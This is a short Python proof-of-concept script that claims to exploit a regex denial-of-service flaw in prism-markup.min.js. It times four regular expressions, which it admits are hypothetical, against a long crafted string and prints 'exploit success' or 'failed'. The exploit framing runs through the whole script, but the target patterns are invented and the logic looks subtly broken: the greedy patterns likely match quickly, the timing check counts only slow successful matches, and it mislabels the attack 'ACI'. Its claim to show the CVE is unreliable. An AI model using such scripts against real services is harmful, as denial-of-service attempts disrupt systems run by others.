import re
import time

# Simulating the vulnerable regex patterns from prism-markup.min.js
# These are hypothetical patterns based on the CVE description.
vulnerable_regexes = [
    re.compile(r'(\s+|\w+|\d+|\W+|\D+)*'),
    re.compile(r'([a-zA-Z]+|\s+|\d+|\W+|\D+)*'),
    re.compile(r'(\w+|\W+|\s+|\d+|\D+)*'),
    re.compile(r'(\d+|\D+|\w+|\W+|\s+)*')
]

# Crafted input that causes excessive backtracking
exploit_input = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" * 1000

# Function to test the regex for vulnerability
def test_regex_performance(regex, test_input):
    start_time = time.time()
    try:
        # If the regex operation takes too long, consider it a successful exploit
        if regex.match(test_input):
            duration = time.time() - start_time
            if duration > 2:  # More than 2 seconds to process
                return True
    except re.error:
        pass
    return False

# Main execution
if any(test_regex_performance(regex, exploit_input) for regex in vulnerable_regexes):
    print('The ACI exploit success!!!')
else:
    print('The ACI exploit failed!!!')
